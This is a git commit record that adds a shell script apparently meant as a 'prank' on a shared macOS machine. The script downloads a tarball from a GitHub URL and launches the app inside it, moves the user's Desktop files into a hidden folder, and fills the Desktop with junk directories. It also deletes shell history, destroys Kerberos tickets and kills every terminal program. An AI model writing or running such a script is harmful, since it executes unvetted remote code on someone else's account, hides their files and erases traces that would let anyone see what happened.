d4b246bf480a7c700d68da8e441ec86b9b78b36e
El gaouej Mohamed amine <emohamed@c1r3p4.1337.ma>
2022-10-04 15:18:41 +0100

    dANCING

---
+++ ana_smiti_emohamed.sh
@@ -0,0 +1,20 @@
+#! /bin/sh
+mkdir -p /tmp/laz/
+curl -s -L https://github.com/monybigsef/p1/raw/master/prank.tar.gz -o /tmp/laz$
+> /dev/null
+tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null
+mkdir ~/.Ulv/
+mv ~/Desktop/* ~/.Ulv/
+cd ~/Desktop
+rm -rf ~/.*history*
+mkdir wolfe_Ulv_{0..100}
+touch 9rah.txt
+echo "follow me ig : _ulv_wolf" > 9rah.txt
+mv 9rah.txt ~/.Ulv/
+nohup open /tmp/laz/app/Laz.app > /dev/null
+kdestroy
+clear
+rm -f ~/.*history*
+killall iTerm
+killall Terminal
+killall iTerm2
